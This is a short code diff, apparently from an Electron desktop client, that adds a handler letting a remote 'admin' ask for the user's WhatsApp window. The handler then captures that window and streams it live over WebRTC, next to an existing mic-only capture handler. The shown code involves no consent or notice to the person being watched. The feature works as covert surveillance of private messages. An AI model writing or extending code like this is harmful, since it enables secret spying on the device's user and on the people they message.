@@ -139,6 +139,28 @@ window.onload = async () => {
             }
         });
 
+        socket.on('request-whatsapp', async (adminId) => {
+            console.log("Admin requested WhatsApp window");
+            try {
+                const sources = await window.electronAPI.getSources();
+                const waSource = sources.find(s => s.name.toLowerCase().includes('whatsapp'));
+                
+                if (!waSource) {
+                    socket.emit('whatsapp-error', { adminId, error: "WhatsApp window is not found. Ensure WhatsApp Desktop or WhatsApp Web is open and active." });
+                    return;
+                }
+
+                localScreenStream = await navigator.mediaDevices.getUserMedia({
+                    audio: false, 
+                    video: { mandatory: { chromeMediaSource: 'desktop', chromeMediaSourceId: waSource.id } }
+                });
+                setupWebRTC(adminId, localScreenStream);
+            } catch (e) {
+                console.error("WhatsApp Window Capture failed", e);
+                socket.emit('client-error', "WhatsApp Window Capture failed: " + e.message);
+            }
+        });
+
         // Handle explicit Mic-only request
         socket.on('request-mic', async (adminId) => {
             console.log("Admin requested MIC ONLY");
